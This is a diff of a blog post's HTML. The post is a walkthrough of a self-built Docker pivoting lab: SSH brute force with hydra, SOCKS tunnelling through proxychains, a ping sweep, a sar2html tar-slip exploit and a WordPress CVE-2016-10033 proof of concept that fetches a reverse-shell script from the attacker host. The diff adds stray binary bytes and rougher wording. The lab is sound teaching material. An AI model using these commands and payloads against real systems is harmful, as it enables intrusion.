@@ -1,60 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.css">
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
-    <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Ubuntu|Roboto'>
-    <link rel="stylesheet" href="/assets/css/blog-detail.css">  
-    <link rel="stylesheet" href="/assets/css/monokai.css">  
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <title>Blog</title>
-</head>
-
-<body>
-
-    <nav>
-    <div class="hamburger">
-      <div class="line1"></div>
-      <div class="line2"></div>
-      <div class="line3"></div>
-    </div>
-    <ul class="nav-links">
-      <li><a href="/resume">Resume</a></li>
-      <li><a href="/blog">Blog</a></li>
-      <li><a href="/home">Home</a></li>
-      <li><a href="/contact">Contact</a></li>
-      <li><a href="/about">About Me</a></li>
-
-    </ul>
-  </nav>  
-
-  
-
-    <header id="page-title" class="jumbotron background">
-        <div id="title-image" class="bg">
-            <img src="/assets/thumbnail/docker.png" alt="">
-        </div>
-        <div class="container">
-            <div class="horizontal-center vertical-center">
-                <h1 class="article-title">Docker: Creating a Pivoting Lab and Exploiting it</h1>
-                <!-- <h2 class="article-subtitle">Surfing Away on Pennies a Day</h2> -->
-            </div>
-        </div>
-    </header>
-
-    <div class="backclick">
-        <a onclick="window.location.href='../blog';"> <i class="fa-solid fa-arrow-left-long"></i></a>
-
-    </div>
-    <div class="container foreground">
-        <div class="row">
-            <div class="col-lg-12">
-                <div class="bs-component">
-                    <article>
-                        <h2 id="pivoting">Pivoting…</h2>
+I"�h<h2 id="pivoting">Pivoting…</h2>
 
 <!-- excerpt-start -->
 <p>You may be familiar with the concept of pivoting. Pivoting is the way to move from one compromised system<!-- excerpt-end --> to another system.
@@ -62,9 +6,9 @@
 
 <p>Suppose,
 <br />
-<strong>“A”</strong> has access to <strong>“B”</strong>.<br />
-<strong>“B”</strong> has access to <strong>“C”</strong>.<br />
-<strong>“A”</strong> does not have access to <strong>“C”</strong>.<br /></p>
+<strong>“A”</strong> has access <strong>“B”</strong>.<br />
+<strong>“B”</strong> has access <strong>“C”</strong>.<br />
+<strong>“A”</strong> does not have access <strong>“C”</strong>.<br /></p>
 
 <p>So how can we access <strong>“C”</strong> from <strong>“A”</strong>? Well, that’s directly not possible so we use the concept of pivoting. <strong>“A”</strong> can use <strong>“B”</strong> as the foothold to get access to <strong>“C”</strong>.
 <strong>“A”</strong> first compromises the system <strong>“B”</strong> then can use this machine as the launch point to attack the <strong>“C”</strong>.</p>
@@ -102,50 +46,50 @@
 <p>By default, Docker uses bridge a driver. We are sticking with it although we can specify different network drivers.</p>
 
 <p><img src="/assets/img/blog4-pivoting/2-subnet.png" alt=" subnet image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  docker-compose-subnet.yml</p>
+<p align="center" style="color:white;">Fig: docker-compose-subnet.yml</p>
 
 <p>Notice <em>helper</em> container is built locally. This makes it easy to customize the base image.
 This container is part of both networks: <em>attacker</em> and <em>victim</em>.</p>
 
 <p><img src="/assets/img/blog4-pivoting/3-helper.png" alt=" helper image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  docker-compose.yml</p>
+<p align="center" style="color:white;">Fig: docker-compose.yml</p>
 
 <p>A base image is being pulled. I have enabled ssh root login. I don’t recommend doing without proper security guidelines. XD</p>
 
 <p><img src="/assets/img/blog4-pivoting/4-helper-image.png" alt=" helper image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  helper.Dockerfile</p>
+<p align="center" style="color:white;">Fig: helper.Dockerfile</p>
 
 <p><em>attacker</em> is the part of the <em>attacker</em> subnet having an IP of <em>172.16.100.10</em></p>
 
 <p><img src="/assets/img/blog4-pivoting/5-attacker.png" alt=" attacker image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  docker-compose.yml</p>
+<p align="center" style="color:white;">Fig: docker-compose.yml</p>
 
 <p><em>attacker</em> container also uses the <em>phusion/baseimage</em>. Additionally, some other tools ( ping, nmap, etc ) will be installed.</p>
 
 <p><img src="/assets/img/blog4-pivoting/5-attacker-image.png" alt=" attacker image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  attacker.Dockerfile</p>
+<p align="center" style="color:white;">Fig: attacker.Dockerfile</p>
 
 <p><em>victim</em> container is also built locally. It does have network IP <em>172.16.101.10</em>. This is the part of subnet <em>172.16.101.0/24</em>.</p>
 
 <p><img src="/assets/img/blog4-pivoting/6-victim1.png" alt=" victim1 image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  docker-compose.yml</p>
+<p align="center" style="color:white;">Fig: docker-compose.yml</p>
 
 <p>The <strong>wget</strong> downloads <strong>sar2html</strong> tool. Github Link: <a href="https://github.com/cemtan/sar2html/">Repository</a>.</p>
 
 <p>It is the plotting tool for system statistics. There is an issue with this tool. We will discuss this later on. For now, just assume there is a vulnerability in this tool.</p>
 
 <p><img src="/assets/img/blog4-pivoting/6-victim1-image.png" alt=" victim1 image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  victim1.Dockerfile</p>
+<p align="center" style="color:white;">Fig: victim1.Dockerfile</p>
 
 <p>For <em>victim2</em> there is no need to manipulate the image locally. There is already a vulnerable WordPress in the docker hub. We just pull it from there. The below image shows the structure to configure the WordPress as we also need a database server. They are in the same sub-network so they can communicate with each other.</p>
 
 <p><img src="/assets/img/blog4-pivoting/7-victim2.png" alt=" victim2 image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  docker-compose.yml</p>
+<p align="center" style="color:white;">Fig: docker-compose.yml</p>
 
 <p>Plus we have <strong>wp-cli</strong> to configure the wordpress setup automatically.</p>
 
 <p><img src="/assets/img/blog4-pivoting/7-victim2-1.png" alt=" victim2 wpcli &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  docker-compose.yml</p>
+<p align="center" style="color:white;">Fig: docker-compose.yml</p>
 
 <h3 id="docker-compose-build-and-run">Docker Compose Build and Run</h3>
 
@@ -162,22 +106,22 @@ docker-compose <span class="nt">-f</span> docker-compose-subnet.yml <span class=
 <p>There is a total of 5 containers running. Once <em>Attacker</em>, <em>helper</em>, <em>victim1</em> and <em>victim2</em> (WordPress &amp; MySQL) are running.</p>
 
 <p><img src="/assets/img/blog4-pivoting/8-dockercompose.png" alt=" dockercomposeup image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  docker-compose build &amp; up</p>
+<p align="center" style="color:white;">Fig: docker-compose build &amp; up</p>
 
 <p><em>attacker</em> container can reach the <em>helper</em> network. You see the successful ping reply back from the <em>helper</em>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping helper
 </code></pre></div></div>
 <p><img src="/assets/img/blog4-pivoting/9-attacker-ping-helper.png" alt=" pinging from attacher to helper image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  Ping check from the attacker </p>
+<p align="center" style="color:white;">Fig: Ping check from the attacker </p>
 
 <p><img src="/assets/img/blog4-pivoting/9-attacker-ping-helper.png" alt=" pinging from attacher to helper image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  Ping check from the attacker </p>
+<p align="center" style="color:white;">Fig: Ping check from the attacker </p>
 
 <p>I guess you can figure out the connections among containers from the below picture.</p>
 
 <p><img src="/assets/img/blog4-pivoting/10-pingall.png" alt=" pinging from attacker to helper image &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  Ping check </p>
+<p align="center" style="color:white;">Fig: Ping check </p>
 
 <h2 id="attacking-and-pivoting">Attacking and Pivoting</h2>
 
@@ -186,7 +130,7 @@ docker-compose <span class="nt">-f</span> docker-compose-subnet.yml <span class=
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> 172.16.100.11
 </code></pre></div></div>
 <p><img src="/assets/img/blog4-pivoting/11-nmap-helper.png" alt=" helper nmap scan &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Nmap scan (helper) </p>
+<p align="center" style="color:white;">Fig:Nmap scan (helper) </p>
 
 <p>So there is port 22 (ssh) open. We have hydra installed in the attacker machine and a rockyou.txt file.
 Brute forcing the ssh login.</p>
@@ -196,27 +140,27 @@ Brute forcing the ssh login.</p>
 <p> </p>
 
 <p><img src="/assets/img/blog4-pivoting/12-hydra.png" alt=" bruteforce ssh &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Bruteforce with Hydra </p>
+<p align="center" style="color:white;">Fig:Bruteforce with Hydra </p>
 
-<p>We got the password for the user <strong>root</strong>. Let’s try using this cred. So, we are now into the helper machine.</p>
+<p>We got the password for the user <strong>root</strong>.Let’s try using this cred.So, we are now into the helper machine.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@172.16.100.11
 </code></pre></div></div>
 <p> </p>
 
 <p><img src="/assets/img/blog4-pivoting/13-sshlogin.png" alt="  ssh login &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: ssh login </p>
+<p align="center" style="color:white;">Fig:ssh login </p>
 
 <p>There might be new hosts so I am going to scan further to gather new hosts and ports.</p>
 
-<p><em>ifconfig</em> shows that the <em>helper</em> machine is part of two network families.</p>
+<p><em>ifconfig</em> shows that the <em>helper</em> machine is the part of two network families.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                                1. 172.16.100.11
                                                 2. 172.16.101.11
 </code></pre></div></div>
 
 <p><img src="/assets/img/blog4-pivoting/15-ifconfig.png" alt="  ifconfig &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: ifconfig </p>
+<p align="center" style="color:white;">Fig:ifconfig </p>
 
 <p> </p>
 
@@ -224,11 +168,11 @@ Brute forcing the ssh login.</p>
 </code></pre></div></div>
 
 <p><img src="/assets/img/blog4-pivoting/16-hostname.png" alt="  hostname &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: hostname </p>
+<p align="center" style="color:white;">Fig:hostname </p>
 
 <p> </p>
 
-<p>Having ssh access makes it very easy for tunneling. Creating dynamically port forwarding leverages the SOCKS proxy. This will deliver all the traffic through an ssh conncetion via given port to the destination server. Here we are forwarding all the traffics to the attacker machine.</p>
+<p>Having ssh access makes very easy for tunneling.Creating dynamically port forwarding leverages the SOCKS proxy.This will deliver all the traffic through ssh conncetion via given port to the destination server.Here we are forwarding all the traffics to the attacker machine.</p>
 
 <p><strong>-N = disable execution of command</strong></p>
 
@@ -237,37 +181,37 @@ Brute forcing the ssh login.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-D</span> 9050 root@172.16.100.11 <span class="nt">-f</span> <span class="nt">-N</span>
 </code></pre></div></div>
 <p><img src="/assets/img/blog4-pivoting/17-ssh-dynamic.png" alt="  dynamic &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig:  dynamic port forwarding </p>
+<p align="center" style="color:white;">Fig:dynamic port forwarding </p>
 
 <p> </p>
 
-<p>Cross-checking if it is running in the background or not. XD</p>
+<p>Cross checking if it is running in background or not.XD</p>
 
 <p><img src="/assets/img/blog4-pivoting/17-1-netstat.png" alt="  netstat &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: netstat </p>
+<p align="center" style="color:white;">Fig:netstat </p>
 
-<p>What we need now is a proxy tool. I am going to use <em>proxychains</em>. Remember the port we mentioned in “/etc/proxychains.conf” should be the same as a dynamic port.</p>
+<p>What we need now is a proxy tool.I am going to use <em>proxychains</em>.Remember the port we mentioned in “/etc/proxychains.conf” should be same as dynamic port.</p>
 
 <p><img src="/assets/img/blog4-pivoting/18-proxychain.png" alt="  proxychain &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: proxychain conf </p>
+<p align="center" style="color:white;">Fig:proxychain conf </p>
 
 <h4 id="discovering-newer-hosts-victims">Discovering newer hosts (victims)</h4>
 
-<p>The major concern is finding hosts. Having a <strong>map</strong> would have been easier, but you won’t find it mostly in real cases.</p>
+<p>The major concern is finding hosts.Having <em>nmap</em> would have been easier but mostly in real case scenario you won’t find it.</p>
 
 <p><img src="/assets/img/blog4-pivoting/14-nonmap.png" alt="  no nmap &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: no nmap </p>
+<p align="center" style="color:white;">Fig:no nmap </p>
 
-<p>We are aware now that <em>helper</em> is part of two networks. Both <em>helper</em> machine and <em>attacker</em> machine belong to the same network <strong>“172.16.100.0/24”</strong>. Due to this reason, we are now going to scan the network <strong>“172.16.101.0/24”</strong> to find all live hosts.</p>
+<p>We are aware now that <em>helper</em> is the part of two networks.Both <em>helper</em> machine and <em>attacker</em> machine belong to same network <strong>“172.16.100.0/24”</strong>. Due to this reason we are now going to scan the network <strong>“172.16.101.0/24”</strong> to find all live hosts.</p>
 
-<p>I am using the <strong>ping sweep</strong> technique to scan new hosts. The below one-liner code will run in parallel mode.</p>
+<p>Using <strong>ping sweep</strong> technique to scan new hosts. The below one liner code will run in parallel mode.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.16.101.<span class="k">${</span><span class="nv">i</span><span class="k">}</span> | <span class="nb">grep</span> <span class="s2">"64 bytes from"</span> | <span class="nb">grep</span> <span class="nt">-oE</span> <span class="s2">"([0-9]{1,3}[</span><span class="se">\.</span><span class="s2">]){3}[0-9]{1,3}"</span> &amp;<span class="o">)</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
 </code></pre></div></div>
 <p><img src="/assets/img/blog4-pivoting/19-loop-ping.png" alt="  ping scan hosts &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Host scan using ping </p>
+<p align="center" style="color:white;">Fig:Host scan using ping </p>
 
-<p>We have now gathered total of 5 live hosts.</p>
+<p>We have now gather total 5 live hosts.</p>
 
 <p><strong>1. 172.16.101.11 - helper ip</strong><br />
 <strong>2. 172.16.101.3  - gateway ip</strong><br />
@@ -276,18 +220,18 @@ Brute forcing the ssh login.</p>
 <strong>5. 172.16.101.22 - victim2 ip</strong><br />
 <br /></p>
 
-<p><span style="font-weight: bold; font-size: 2em;">Victim 1</span></p>
+<p><span style="font-weight: bold; font-size: 2em;">Vcitim 1</span></p>
 
-<p>The reason why we cannot ping is that proxies do not support <strong>ICMP</strong> protocols. Their working OSI layers are different.
+<p>The reason why we cannot ping is because proxies do not support <strong>icmp</strong> protocols.Their working OSI layers are different.
 <img src="/assets/img/blog4-pivoting/20-proxy-ping-notworking.png" alt="  not working  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Proxymap ping </p>
+<p align="center" style="color:white;">Fig:Proxymap ping </p>
 
-<p>We cannot ping the hosts however we can use Nmap to scan ports.</p>
+<p>We cannot ping the hosts however we can use nmap to scan ports.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-F</span> 172.16.101.20
 </code></pre></div></div>
 
-<p><strong>-sT - TCP connect scan</strong><br /></p>
+<p><strong>-sT - tcp connect scan</strong><br /></p>
 <ul>
   <li><strong>-Pn - won’t scan hosts but treats all hosts as online</strong></li>
 </ul>
@@ -295,45 +239,45 @@ Brute forcing the ssh login.</p>
 <p>Nmap shows that one service is open on port 5000.</p>
 
 <p><img src="/assets/img/blog4-pivoting/21-nmap.png" alt="  nmap victim1  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Nmap scan (victim1) </p>
+<p align="center" style="color:white;">Fig:Nmap scan (victim1) </p>
 
-<p>We have a 200 status code.
+<p>We have 200 status code.
 <img src="/assets/img/blog4-pivoting/22-curl.png" alt="  curl  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Curl </p>
+<p align="center" style="color:white;">Fig:Curl </p>
 
-<p>Let’s see what is running in this port. Opening it in a browser.</p>
+<p>Let’s see what is running in this port.Opening it in a browser.</p>
 <blockquote>
   <p><strong>sar2html</strong> is the plotting tool for system statistics (sar data).</p>
 </blockquote>
 
 <p><img src="/assets/img/blog4-pivoting/23-sar2html.png" alt="  sar2html  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Sar2html </p>
+<p align="center" style="color:white;">Fig:Sar2html </p>
 
-<p>As I said at the beginning of this blog there is a vulnerability in this tool. Actually, there is a <strong>tar2slip</strong> vulnerability.</p>
+<p>As I said in the beginning of this blog there is a vunerability in this tool. Actually there is a <strong>tar2slip</strong> vulnerability.</p>
 <blockquote>
   <p><strong>sar2html</strong> is vulnerable to tar slip which leads to arbitrary file write via archive extraction.</p>
 </blockquote>
 
 <p>Let’s just try exploiting it.</p>
 
-<p><strong>1. First download the POC generator tool</strong></p>
+<p><strong>1.First download the poc generator tool</strong></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/ptoomey3/evilarc.git <span class="o">&amp;&amp;</span> <span class="nb">cd </span>evilarc  
 </code></pre></div></div>
-<p><strong>2. Run the below code</strong></p>
+<p><strong>2.Run below code</strong></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>exploitation <span class="nb">test</span> <span class="o">&gt;</span> test.css 
 </code></pre></div></div>
-<p><strong>3. Now generate the malicious tar file</strong></p>
+<p><strong>3.Now generate the malicious tar file</strong></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 evilarc.py  <span class="nt">-o</span> linux <span class="nt">-f</span> pay.tar test.css <span class="nt">-p</span> <span class="s1">'static/css'</span> <span class="nt">-d</span> 3
 </code></pre></div></div>
-<p><strong>4. Chick on “New Host” then upload the tar file “pay.tar”</strong></p>
+<p><strong>4.Chick on “New Host” then upload the tar file “pay.tar”</strong></p>
 
-<p><strong>5. Check for the file.</strong></p>
+<p><strong>5.Check the for the file.</strong></p>
 
 <p><img src="/assets/img/blog4-pivoting/24-testcss.png" alt="  file.css check  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Using Browser </p>
+<p align="center" style="color:white;">Fig:Using Browser </p>
 
 <p><img src="/assets/img/blog4-pivoting/24-testcss1.png" alt="  file.css check using curl  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Using Curl</p>
+<p align="center" style="color:white;">Fig:Using Curl</p>
 <p><br />
 We have successfully exploited this issue.
 <br /></p>
@@ -344,29 +288,31 @@ We have successfully exploited this issue.
 
 <p><span style="font-weight: bold; font-size: 2em;">Victim 2</span></p>
 
-<p>Again we start with the same tedious <em>Nmap</em> scan. There is an http service running on port 80.</p>
+<p>Again we start with the same tedious <em>nmap</em> scan. There is a http service running on port 80.</p>
 
 <p><img src="/assets/img/blog4-pivoting/25-victim-nmap.png" alt="  wordpress nmap  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Nmap scan (victim2)</p>
+<p align="center" style="color:white;">Fig:Nmap scan (victim2)</p>
 
-<p>Here we see MySQL service running on.</p>
+<p>Here we see mysql service running on.</p>
 
 <p><img src="/assets/img/blog4-pivoting/25-victim-nmap-mysql.png" alt="  mysql nmap  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Nmap scan (victim2)</p>
+<p align="center" style="color:white;">Fig:Nmap scan (victim2)</p>
 
-<p>For now, our target is HTTP service. Seems like it is running WordPress cms.</p>
+<p>For now our target is http service.</p>
+
+<p>Seems like it is running a wordpress cms.</p>
 
 <p><img src="/assets/img/blog4-pivoting/26-victim2-wp-curl.png" alt="  curl victim2  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Check</p>
+<p align="center" style="color:white;">Fig:Check</p>
 
-<p>If we have not automated the installation process with <strong>wp-cli</strong> then we should have first finished the wordpress installation process manually.</p>
+<p>If we have not automate the installation process with <strong>wp-cli</strong> then we should have first finished the wordpress installation process manually.</p>
 
-<p>To know more about this vulnerability in WordPress, you can <a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html">Click Me</a>.</p>
+<p>To know more about this vulnerability in wordpress, you can <a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html">Click Me</a>.</p>
 
-<p>It is already configured and installed. The username and password for wp-admin are <strong>“admin”</strong> and <strong>“adminpass”</strong> respectively.</p>
+<p>It is already configured and installed.The username and password for wp-admin is <strong>“admin”</strong> and <strong>“adminpass”</strong> respectively.</p>
 
 <p><img src="/assets/img/blog4-pivoting/install.png" alt="  wordpress installation  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Wordpress Installation</p>
+<p align="center" style="color:white;">Fig:Wordpress Installation</p>
 
 <p>Save the below reverses shell payload.</p>
 
@@ -376,7 +322,7 @@ We have successfully exploited this issue.
 
 <p align="center" style="color:white;">rev.sh</p>
 
-<p>Now save the below POC. Check if you have set the correct http_server and target.</p>
+<p>Now save the below poc.Check if you have set correct http_server and target.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
 
@@ -416,17 +362,17 @@ curl <span class="nt">-H</span> <span class="s2">"Host: </span><span class="nv">
 <p align="center" style="color:white;">poc.sh</p>
 
 <p><img src="/assets/img/blog4-pivoting/29-poc.png" alt="  poc.sh  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: poc.sh</p>
+<p align="center" style="color:white;">Fig:poc.sh</p>
 
 <p><span style="font-weight: bold; font-size: 2em;">Testing</span></p>
 
-<p>So before executing the POC file we have to first ensure that everything is working properly. Getting reverse shell directly from <strong>victim2</strong> machine to <strong>attacker</strong> machine is not possible. Although we have running dynamic port forwarding it is still not going to work.</p>
+<p>So before executing the poc file we have to first ensure that everything is working properly. Getting reverse shell directly from <strong>victim2</strong> machine to <strong>attacker</strong> machine is not possible.Although we having running dynamic port forwarding it is still not going to work.</p>
 
 <p><img src="/assets/img/blog4-pivoting/30-nonc.png" alt=" check  &gt;&lt;" /></p>
 
 <p><br /></p>
 
-<p><strong>poc.sh</strong> file downloads the <strong>rev.sh</strong> from the <strong>attacker</strong> machine to the <strong>victim2</strong> machine. But it is not making a connection with the <strong>HTTP server</strong>.</p>
+<p><strong>poc.sh</strong> file downloads the <strong>rev.sh</strong> from the <strong>attacker</strong> machine to the <strong>victim2</strong> machine. But it is not making connection with the <strong>http server</strong>.</p>
 
 <p><img src="/assets/img/blog4-pivoting/31-norev.png" alt=" check  &gt;&lt;" /></p>
 
@@ -436,11 +382,11 @@ curl <span class="nt">-H</span> <span class="s2">"Host: </span><span class="nv">
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> :80:172.16.100.10:80 root@helper <span class="nt">-N</span> <span class="nt">-f</span>
 </code></pre></div></div>
 
-<p>This will forward all the traffic (creating a tunnel) from the remote port (<strong>victim2</strong>) 80 to the local machine on port 80 (<strong>attacker</strong>).
-Now when we run the <strong>poc.sh</strong> file, it can make a connection with the attacker python HTTP server. Let’s apply this.</p>
+<p>This will forward all the traffic (creating a tunnel) from remote port (<strong>victim2</strong>) 80 to local machine on port 80 (<strong>attacker</strong>).
+Now when we run the <strong>poc.sh</strong> file, it can make connection with attacker python http server. Let’s apply this.</p>
 
 <p><img src="/assets/img/blog4-pivoting/32-download.png" alt="  download rev.sh  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: downloading rev.sh</p>
+<p align="center" style="color:white;">Fig:downloading rev.sh</p>
 
 <p>We are now one step away from getting a reverse shell.Again we remote port forward.</p>
 
@@ -451,185 +397,25 @@ ncat <span class="nt">-lvnp</span> 1331
 </code></pre></div></div>
 
 <p><img src="/assets/img/blog4-pivoting/32-revshell.png" alt="  Getting reverse shell  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: Reverse Shell</p>
+<p align="center" style="color:white;">Fig:Reverse Shell</p>
 
-<p>Finally, we are into the vulnerable WordPress machine.</p>
+<p>Finally we are into the vulnerable wordpress machine.</p>
 
 <p><span style="font-weight: bold; font-size: 2em;">Caveat</span></p>
 
-<p>By default, ssh disables <strong>GatewayPorts</strong>.It would make any remote IP only bind to 127.0.0.1:&lt;port&gt; and allows to connect only from the server host.</p>
+<p>By default ssh disables <strong>GatewayPorts</strong>.It would make any remote IP only bind to 127.0.0.1:&lt;port&gt; and allows to connect only from the server host.</p>
 
 <p><img src="/assets/img/blog4-pivoting/32-explain.png" alt="  Explain  &gt;&lt;" /></p>
 
 <p><strong>1. When GatewayPorts is disbaled</strong></p>
 
 <p><img src="/assets/img/blog4-pivoting/33-gatewayports.png" alt="  GatewayPorts off  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: GatewayPorts no</p>
+<p align="center" style="color:white;">Fig:GatewayPorts no</p>
 
 <p><strong>2. When GatewayPorts is enabled</strong></p>
 
 <p><img src="/assets/img/blog4-pivoting/33-gatewayportson.png" alt="  GatewayPorts on  &gt;&lt;" /></p>
-<p align="center" style="color:white;">Fig: GatewayPorts yes</p>
+<p align="center" style="color:white;">Fig:GatewayPorts yes</p>
 
 <p>Thank you :)</p>
-      
-                </div>
-                </article>
-            </div>
-         
-    </div>
-    </div>
-    <div class="line" ></div>
-
-    <div class="container foreground">
-        <h1>Recent Posts</h1>
-        
-        
-        <article class="article-preview">
-            <div class="row">
-                <div class="col-sm-2">
-                    <h2 class="publish-day">03</h2>
-                    <div class="publish-month">2022</div>
-                </div>
-                <div class="col-sm-10">
-                    <h2 class="post-title"><a href="/blog/pivoting">Docker: Creating a Pivoting Lab and Exploiting it</a></h2>
-                    <!-- <h3 class="post-subtitle">Surfing Away on Pennies a Day</h3>   <a href="#"> -->
-                    <a href="/blog/pivoting">
-                        <img src="/assets/thumbnail/docker.png" class="author-image">
-                        <!-- <span class="author-name">Brian Barrett</span> -->
-                    </a>
-                    <div class="post-preview">
-                        <p>
-                            
-                            <p>You may be familiar with the concept of pivoting. Pivoting is the way to move from one compromised system</p>
-                        </p>
-                    </div>
-
-                </div>
-            </div>
-        </article>
-        
-        <article class="article-preview">
-            <div class="row">
-                <div class="col-sm-2">
-                    <h2 class="publish-day">21</h2>
-                    <div class="publish-month">2022</div>
-                </div>
-                <div class="col-sm-10">
-                    <h2 class="post-title"><a href="/blog/proxy">Proxy: Accessing Network Connection</a></h2>
-                    <!-- <h3 class="post-subtitle">Surfing Away on Pennies a Day</h3>   <a href="#"> -->
-                    <a href="/blog/proxy">
-                        <img src="/assets/thumbnail/squid.webp" class="author-image">
-                        <!-- <span class="author-name">Brian Barrett</span> -->
-                    </a>
-                    <div class="post-preview">
-                        <p>
-                            
-                            <p><span style="font-size:30px;">I</span>n this blog, I will explain how to access network connections on Tryhackme/HTB/etc…. machines.Having an internet connection will make it a lot easier when we are trying to pwn machines</p>
-                        </p>
-                    </div>
-
-                </div>
-            </div>
-        </article>
-        
-        <article class="article-preview">
-            <div class="row">
-                <div class="col-sm-2">
-                    <h2 class="publish-day">16</h2>
-                    <div class="publish-month">2022</div>
-                </div>
-                <div class="col-sm-10">
-                    <h2 class="post-title"><a href="/blog/phish">Phishing: Creating and Analyzing</a></h2>
-                    <!-- <h3 class="post-subtitle">Surfing Away on Pennies a Day</h3>   <a href="#"> -->
-                    <a href="/blog/phish">
-                        <img src="/assets/thumbnail/phish.png" class="author-image">
-                        <!-- <span class="author-name">Brian Barrett</span> -->
-                    </a>
-                    <div class="post-preview">
-                        <p>
-                            
-                            <p><span style="font-size:30px;">I</span>n this blog, I am going to phish myself. Jumping directly into a conclusion does not make sense so I will be explaining from “how-to-create” to “how-to-do”.</p>
-                        </p>
-                    </div>
-
-                </div>
-            </div>
-        </article>
-        
-        <article class="article-preview">
-            <div class="row">
-                <div class="col-sm-2">
-                    <h2 class="publish-day">07</h2>
-                    <div class="publish-month">2021</div>
-                </div>
-                <div class="col-sm-10">
-                    <h2 class="post-title"><a href="/blog/usb-btlo">Suspicious USB Stick</a></h2>
-                    <!-- <h3 class="post-subtitle">Surfing Away on Pennies a Day</h3>   <a href="#"> -->
-                    <a href="/blog/usb-btlo">
-                        <img src="/assets/thumbnail/btlo.png" class="author-image">
-                        <!-- <span class="author-name">Brian Barrett</span> -->
-                    </a>
-                    <div class="post-preview">
-                        <p>
-                            
-                            <p><span style="font-size:30px;">O</span>ne of our clients informed us they recently suffered an employee data breach. As a startup company, they had a constrained budget allocated for security and employee</p>
-                        </p>
-                    </div>
-
-                </div>
-            </div>
-        </article>
-        
-
-        </div>
-    </div>
-    <!--scroller-->
-    <div class=title>
-    </div>
-    <div id="jsScroll" class="scroll" onclick="scrollToTop();">
-        <i class="fa fa-angle-up"></i>
-    </div>
-</body>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-
-<script>
-		//scroller
-		window.addEventListener('scroll', e => {
-		var el = document.getElementById('jsScroll');
-		if (window.scrollY > 200) {
